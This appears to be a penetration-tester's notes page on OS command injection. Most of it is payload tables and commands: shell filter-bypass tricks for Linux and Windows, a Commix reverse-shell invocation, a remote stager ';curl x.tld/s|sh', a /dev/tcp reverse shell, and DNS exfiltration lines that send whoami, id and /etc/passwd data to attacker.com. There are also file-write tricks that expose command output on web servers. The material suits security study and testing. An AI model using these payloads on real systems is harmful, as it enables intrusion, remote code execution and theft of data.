+++
title = 'OS Command Injection'
date = 2026-10-30
type = 'notes'
weight = 110
toc = true
tags = ['web', 'web-attacks', 'command-injection']
+++

OS command injection occurs when user-controlled input is misinterpreted as part of a system command. It is the highest-impact web vulnerability class after SQLi — a single injection point is often full remote code execution, and the filter-bypass surface is broader than any other injection type because **the shell performs its own expansion after the filter has already made its decision**.

> **2025–2026 context:** OS command injection is no longer just `; id` in a `ping` parameter. It lives in **CLI argument handling** (Llama-Index `--files`), **AI/agent tool calling**, **CI/CD runners**, and **network appliance diagnostics**. The filter-bypass research has shifted toward **length-constrained injection** and **semantic-equivalent mutation** that survives WAF inspection.

---

## 1. Tools

| Tool | What it does |
|---|---|
| **Commix** | Automated detection and exploitation — results-based, time-based, file-based, and **OAST (DNS/HTTP)** techniques; interactive OS shells; `reverse_tcp` and `bind_tcp` modes; WAF detection **cached per target**; new `--threads` for parallel retrieval; `randomcase.py` tamper script |
| **Bashfuscator** | Obfuscates Bash commands to evade signature filters |
| **Invoke-DOSfuscation** | Windows CMD/PowerShell obfuscation |
| [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) | Payload reference |
| [Bo0oM's cheat sheet](https://github.com/Bo0oM) | Shell-syntax variations |
| [interactsh](https://app.interactsh.com/) / **Burp Collaborator** | OOB confirmation (DNS, HTTP, SMTP) |

**Commix quick reference:**

```bash
# Basic detection and exploitation
commix -u "http://target/ping.php?ip=127.0.0.1"

# Specify the injection point
commix -u "http://target/ping.php?ip=127.0.0.1*"

# OS shell
commix -u "http://target/ping.php?ip=127.0.0.1" --os-shell

# Reverse TCP shell
commix -u "http://target/ping.php?ip=127.0.0.1" --os-cmd="id" --reverse-tcp ATTACKER:4444

# WAF bypass tamper scripts
commix -u "http://target/?cmd=id" --tamper=randomcase,space2ifs
```

---

## 2. Injection Operators

| Operator | Character | URL-Encoded | Execution behaviour |
|---|---|---|---|
| **Semicolon** | `;` | `%3b` | Both commands run |
| **Newline** | `\n` | `%0a` | Both commands run — **the most reliable separator** |
| **Background** | `&` | `%26` | Both run; second output usually shown first |
| **Pipe** | `\|` | `%7c` | Both run; only second output shown |
| **AND** | `&&` | `%26%26` | Second runs only if first succeeds |
| **OR** | `\|\|` | `%7c%7c` | Second runs only if first fails |
| **Sub-shell (backtick)** | `` ` `` | `%60` | Both run — **Linux only** |
| **Sub-shell (`$()`)** | `$()` | `%24%28%29` | Both run — **Linux only** |
| **Tab** | `\t` | `%09` | Whitespace separator; not a command separator |

> **The newline (`%0a`) is the highest-value operator.** It is not blocked by filters that target `;`, `&`, and `|`, and it is the recommended separator in the HackTricks command-injection reference. Combining it with tabs — `ls%0abash%09-c%09"id"%0a` — bypasses both separator and space filters in one payload.

---

## 3. Linux — Filtered Character Bypass

The filter inspects a **literal string**; the shell executes a **different string** after quote removal, parameter expansion, command substitution, and pathname expansion have run. Every technique exploits that gap.

| Filtered character | Bypass | Explanation |
|---|---|---|
| **Space** | `%09` | Tab — shell splits on `IFS` (space, tab, newline) |
| **Space** | `${IFS}` | Expands to space + tab; **does not work inside `$()`** |
| **Space** | `$IFS$9` | `$IFS` followed by `$9` (empty positional parameter) — avoids brace expansion issues |
| **Space** | `{cat,/etc/passwd}` | Brace expansion inserts a space at execution |
| **Space** | `cat</etc/passwd` | Input redirection replaces the space |
| **Space** | `$@` | Empty variable; `cat$@/etc/passwd` → `cat /etc/passwd` |
| **`/`** | `${PATH:0:1}` | First character of `$PATH` is `/` |
| **`/`** | `${PATH%%u*}` | Everything before `u` in `$PATH` |
| **`;`** | `${LS_COLORS:10:1}` | Character at index 10 of `$LS_COLORS` is `;` |
| **Any character** | `$(tr '!-}' '"-\~'<<<\[)` | Shift a character by one (`[` → `\`) |
| **Single quotes** | `c'a't` / `c"a"t` / `c\at` | Quote removal and backslash escaping reconstruct the command |
| **Command name** | `/???/c?t` | Wildcards expand to the binary path without the literal keyword |

**Shell expansion order — why this works:**

1. Tokenisation and quote recognition
2. Parameter expansion (`$VAR`, `${IFS}`, `${PATH:0:1}`), command substitution (`$()`, ``` ` ` ```), arithmetic expansion
3. Field splitting on `IFS`
4. Pathname expansion (globbing: `*`, `?`, `[…]`)
5. Quote removal
6. Redirection
7. Execution

A blocklist matching the literal `cat` runs **before step 1**. `c""at` contains no `cat` until **step 5**. `${IFS}` contains no space until **step 2**. `/bin/c?t` contains no `cat` until **step 4**. The filter and the shell are looking at two different strings.

---

## 4. Windows — Filtered Character Bypass

| Filtered character | Bypass | Context |
|---|---|---|
| **Env enumeration** | `Get-ChildItem Env` | PowerShell |
| **Space** | `%09` | Tab (CMD) |
| **Space** | `%PROGRAMFILES:~10,-5%` | Substring of an env var → space (CMD) |
| **Space** | `$env:PROGRAMFILES[10]` | Index into an env var → space (PowerShell) |
| **`\`** | `%HOMEPATH:~0,-17%` | Substring → `\` (CMD) |
| **`\`** | `$env:HOMEPATH[0]` | Index → `\` (PowerShell) |

---

## 5. Linux — Blacklisted Command Bypass

| Technique | Payload | Notes |
|---|---|---|
| **Case manipulation** | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Normalises case before execution |
| **Case manipulation** | `$(a="WhOaMi";printf %s "${a,,}")` | Bash 4+ lowercase expansion |
| **Reverse** | `echo 'whoami' \| rev` | `rev` reverses the string |
| **Reverse** | `$(rev<<<'imaohw')` | Here-string + `rev` |
| **Base64** | `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode the command |
| **Base64 execute** | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Here-string + decode + execute |
| **Wildcards** | `/???/c?t /e*/p*d` | Avoids literal keywords; shell expands at execution |
| **Variable concatenation** | `a=c; b=at; $a$b /etc/passwd` | Reconstructs the command from fragments |
| **`$@`** | `cat$@/etc/passwd` | Empty variable, splits into space |
| **Shell builtin substitution** | `exec /bin/sh` / `eval id` | Builtins are not external binaries |

---

## 6. Windows — Blacklisted Command Bypass

| Technique | Payload |
|---|---|
| **Case manipulation** | `WhoAmi` — CMD is case-insensitive |
| **Reverse** | `"whoami"[-1..-20] -join ''` |
| **Reverse + execute** | `iex "$('imaohw'[-1..-20] -join '')"` |
| **Base64 encode** | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` |
| **Base64 execute** | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64OUT')))"` |

---

## 7. Length-Limited Input Bypass

When the application caps input at **32, 64, or 128 characters**, the question changes from "can I inject" to "can I fit something useful in this budget". The technique ranking is by **character efficiency**, not novelty.

### 7.1 Budget classes

| Limit | Common source |
|---|---|
| **32 chars** | Legacy hostname / IP fields |
| **64 chars** | Default WAF body-inspection limit |
| **128 chars** | Most application-layer input caps |
| **256+** | Effectively unlimited |

### 7.2 Smallest useful payloads

| Goal | Payload | Length |
|---|---|---|
| **Time-based detection** | `;sleep 5` | 8 chars |
| **DNS exfiltration of `whoami`** | ``;nslookup `whoami`.x.tld`` | ~25 chars |
| **Fetch and run a remote script** | `;curl x.tld/s\|sh` | 16 chars |
| **Direct shell** | `;bash -i >& /dev/tcp/x.tld/443 0>&1` | 33 chars — **exceeds 32** |

### 7.3 Techniques ranked by efficiency

1. **Wildcard reduction** — the shell expands `?` to any single character and `*` to any sequence. `/???/c?t /e*/p*d` avoids the literal keywords `cat`, `etc`, and `passwd` entirely. 12 characters, and no blocklist keyword appears.
2. **Variable assignment + remote stager** — once you can fetch and execute a remote payload, the effective payload size is unlimited. The bottleneck is the fetch primitive: `;curl x.tld/s|sh` is 16 characters with a one-letter domain.
3. **Brace expansion** — `{cat,/etc/passwd}` inserts a space at execution without a literal space character.
4. **Variable concatenation** — `a=c;b=at;$a$b` reconstructs `cat` from fragments the filter never sees together.
5. **Shell builtins** — `exec`, `eval`, `read`, and `.` are built into the shell and do not require an external binary.
6. **History expansion** — `!!`, `!$` — rarely useful in a non-interactive shell, but occasionally the only available primitive.

---

## 8. Blind Command Injection

When the application executes the command but does not return the output, the injection is **blind**. There are three confirmation channels, in order of reliability.

### 8.1 Time-based confirmation

```bash
; sleep 10
; ping -c 10 127.0.0.1
; timeout /t 10        # Windows
```

If the response is delayed by roughly the injected duration, the command executed. Time-based confirmation is **the fastest first test** — `;sleep 5` is 8 characters and fits almost any length budget.

### 8.2 Out-of-band (OAST) — DNS is the most reliable channel

Egress filtering almost never covers DNS. The lookup happens even when HTTP is blocked.

```bash
; nslookup $(whoami).attacker.com
; dig +short p02.attacker.com
; host p03.attacker.com
; ping -c 1 p04.attacker.com
```

**Carrying data in DNS labels** — base32, lowercased, so DNS case-randomisation cannot corrupt it:

```bash
; nslookup $(whoami).attacker.com
; nslookup $(id | base32 -w0 | tr -d '=' | tr 'A-Z' 'a-z').attacker.com
; nslookup $(hostname).$(id -u).attacker.com
; nslookup $(cat /etc/passwd | md5sum | cut -c1-32).attacker.com
```

**Windows equivalents:**

```cmd
& nslookup %USERNAME%.attacker.com
& nslookup %COMPUTERNAME%.attacker.com
& powershell -c "Resolve-DnsName ((whoami) -replace '\\','-').attacker.com"
```

> **Use a fresh unique label on every attempt** — a resolver caches, so a repeated query for the same name may never leave the target's network.

### 8.3 File-write confirmation — full output with no channel

Write the output into a directory that is both **writable** and **served**, then fetch it. This turns a blind finding into ordinary in-band exploitation.

```bash
# Step 1 — write a marker with an unguessable name
; id > /var/www/html/9f2c1a.txt
; whoami > /var/www/html/9f2c1a.txt
; id > ./9f2c1a.txt
; id > uploads/9f2c1a.txt

# Step 2 — fetch it
curl http://target.lab/9f2c1a.txt

# Step 3 — once it works, run anything
; (id; uname -a; pwd; ls -la; cat /etc/passwd) > /var/www/html/9f2c1a.txt 2>&1
; env > /var/www/html/9f2c1a.txt
```

> **Redirect stderr too (`2>&1`)** — a failing command's error message is often more informative than its output, and in a blind context it is the only diagnostic you get.

**Finding a writable, served directory** when you cannot see `ls` output — probe each candidate and test by fetching:

```bash
for d in / /uploads /files /tmp /assets /images /static /cache /media; do
  # inject: ; id > <docroot>$d/9f2c1a.txt
  curl -sS -o /dev/null -w "%{http_code} $d\n" "http://target.lab${d}/9f2c1a.txt"
done
```

---

## 9. PHP Backtick Execution

In PHP, the backtick operator executes its content as a shell command and returns the output — equivalent to `shell_exec()`.

```
http://example.com/ping.php?ip=10.10.10.10;`ls`
```

This is useful when standard shell execution functions are disabled but the backtick operator remains available.

---

## 10. Argument Injection

Argument injection is a distinct class from shell metacharacter injection: the application **does not** pass the input through a shell, but it does pass it as an **argument to a program that interprets it as a flag or option**. The payload contains no `;`, `|`, or `&&` — it contains `--flag` or a URL.

**2025–2026 example — CVE-2025-1753 (Llama-Index CLI):** the `--files` argument was passed to `os.system()` without sanitisation, so a user-controlled filename containing shell metacharacters executed arbitrary commands. The vulnerability was locally exploitable from the CLI and remotely exploitable when a web application called the CLI with a user-controlled filename.

**Other argument-injection surfaces:**

| Program | Dangerous argument | Effect |
|---|---|---|
| `curl` | `-o /etc/cron.d/x` | Write a file |
| `tar` | `--checkpoint-action=exec=sh` | Execute a command |
| `rsync` | `-e sh` | Remote shell |
| `find` | `-exec` | Execute a command |
| `git` | `--upload-pack=…` | Command execution |
| `ssh` | `ProxyCommand=…` | Command execution |

> **Argument injection is not solved by escaping shell metacharacters.** The fix is to use `--` to end option parsing, and to validate that the input does not begin with `-`.

---

## 11. Notable OS Command Injection CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2025-1753 / GHSA-g99h-56mw-8263** | Llama-Index CLI < 0.4.1 | `--files` argument passed to `os.system()` — local and remote command injection |
| **CVE-2025-50201** | WeGIA ≤ 3.4.1 | `debug_info.php` — `branch` argument → OS command injection |
| **CVE-2025-34115** | ITRS OP5 Monitor ≤ 7.1.9 | `command_test.php` — `cmd_str` argument → OS command injection |
| **CVE-2025-64127** | FKIE software | Unauthenticated remote OS command injection via insufficient sanitisation |
| **GHSA-4J66-8F4R-3PJX** | Bun `$` shell API | Improper neutralisation of shell metacharacters → command execution |
| **CVE-2026-85656** | AWS Log4Shell hotpatch (Amazon Linux) | Local users → root command execution |
| **CVE-2025-54948** | Trend Micro Apex One | CISA KEV-listed command injection |
| **CVE-2025-66644** | Array Networks ArrayOS AG | CISA KEV-listed command injection |

**Shellshock (CVE-2014-6271)** and **Log4Shell (CVE-2021-44228)** remain relevant reference points — Shellshock is still actively probed a decade later, and Log4Shell continues to appear in unpatched VMware Horizon and Graylog deployments.

---

## 12. Field Notes

- **The newline (`%0a`) is the best separator.** Filters target `;`, `&`, and `|`; `%0a` is frequently missed. Combine with `%09` (tab) for both separator and space bypass: `ls%0abash%09-c%09"id"%0a`.
- **`${IFS}` does not work inside `$()`.** Use `$IFS$9` or brace expansion instead.
- **Wildcards are the cheapest keyword bypass.** `/???/c?t /e*/p*d` contains no `cat`, no `etc`, and no `passwd` — the shell expands the globs at execution.
- **Quote removal is the whole attack.** `c""at` is not `cat` to the filter, but it is `cat` to the shell after step 5 of expansion.
- **Length limits change the technique order.** `;sleep 5` (8 chars) confirms; `;curl x.tld/s|sh` (16 chars) escalates; wildcards fit where `cat` does not.
- **DNS is the most reliable OOB channel.** Egress filtering almost never covers it, and the lookup happens even when HTTP is blocked.
- **File-write confirmation beats OOB when a served, writable directory exists.** It gives you full in-band output — `2>&1` is mandatory.
- **Argument injection is not shell injection.** The fix is `--`, not escaping.
- **Commix now caches WAF detection per target and supports `--threads`.** For large engagements, this makes automated triage practical.
- **Shellshock and Log4Shell are still in the wild.** A command-injection test on an unpatched appliance or Java service should include both.

This file sits alongside the **SQL Injection**, **SSRF**, and **File Upload** notes: the injection primitives are the same, and the blind-exfiltration and filter-bypass techniques transfer directly between classes.
